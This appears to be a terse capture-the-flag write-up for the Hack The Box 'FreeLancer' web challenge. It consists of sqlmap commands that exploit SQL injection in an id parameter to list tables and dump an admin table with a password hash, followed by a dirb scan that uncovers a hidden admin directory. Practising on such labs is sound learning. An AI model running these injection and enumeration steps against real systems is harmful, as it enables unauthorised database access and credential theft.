## FreeLancer ##

![OWASP](https://github.com/SagiUziel/HackTheBox/blob/master/Web/FreeLancer/ZAP.JPG)

```
> python .\sqlmap.py -u "http://docker.hackthebox.eu:30418/portfolio.php?id=1" -p id --tables

Database: freelancer
[2 tables]
+----------------------------------------------------+
| portfolio                                          |
| safeadmin                                          |
+----------------------------------------------------+
```

```
> python .\sqlmap.py -u "http://docker.hackthebox.eu:30418/portfolio.php?id=1" -p id -T safeadmin --dump

Database: freelancer
Table: safeadmin
[1 entry]
+------+----------+--------------------------------------------------------------+---------------------+
| id   | username | password                                                     | created_at          |
+------+----------+--------------------------------------------------------------+---------------------+
| 1    | safeadm  | $2y$10$s2ZCi/tHICnA97uf4MfbZuhmOZQXdCnrM9VM9LBMHPp68vAXNRf4K | 2019-07-16 20:25:45 |
+------+----------+--------------------------------------------------------------+---------------------+
```
```
sagi@kali:~$ dirb http://docker.hackthebox.eu:30707

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Jul 18 11:29:17 2020
URL_BASE: http://docker.hackthebox.eu:30707/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://docker.hackthebox.eu:30707/ ----
==> DIRECTORY: http://docker.hackthebox.eu:30707/administrat/                                                                                                                
==> DIRECTORY: http://docker.hackthebox.eu:30707/css/                                                                                                                        
+ http://docker.hackthebox.eu:30707/favicon.ico (CODE:200|SIZE:32038)                                                                                                        
==> DIRECTORY: http://docker.hackthebox.eu:30707/img/                                                                                                                        
+ http://docker.hackthebox.eu:30707/index.php (CODE:200|SIZE:9541)                                                                                                           
==> DIRECTORY: http://docker.hackthebox.eu:30707/js/                                                                                                                         
==> DIRECTORY: http://docker.hackthebox.eu:30707/mail/                                                                                                                       
+ http://docker.hackthebox.eu:30707/robots.txt (CODE:200|SIZE:0)                                                                                                             
+ http://docker.hackthebox.eu:30707/server-status (CODE:403|SIZE:311)                                                                                                        
==> DIRECTORY: http://docker.hackthebox.eu:30707/vendor/                                                                                                                     
                                                                                                                                                                             
---- Entering directory: http://docker.hackthebox.eu:30707/administrat/ ----
==> DIRECTORY: http://docker.hackthebox.eu:30707/administrat/include/                                                                                                        
+ http://docker.hackthebox.eu:30707/administrat/index.php (CODE:200|SIZE:1213)                                                                                               
                                                                                                                                                                             
---- Entering directory: http://docker.hackthebox.eu:30707/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                             
---- Entering directory: http://docker.hackthebox.eu:30707/img/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                             
---- Entering directory: http://docker.hackthebox.eu:30707/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                             
---- Entering directory: http://docker.hackthebox.eu:30707/mail/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                             
---- Entering directory: http://docker.hackthebox.eu:30707/vendor/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                             
---- Entering directory: http://docker.hackthebox.eu:30707/administrat/include/ ----
+ http://docker.hackthebox.eu:30707/administrat/include/index.html (CODE:200|SIZE:0)                                                                                         
                                                                                                                                                                             
-----------------
END_TIME: Sat Jul 18 11:48:47 2020
DOWNLOADED: 13836 - FOUND: 6

```
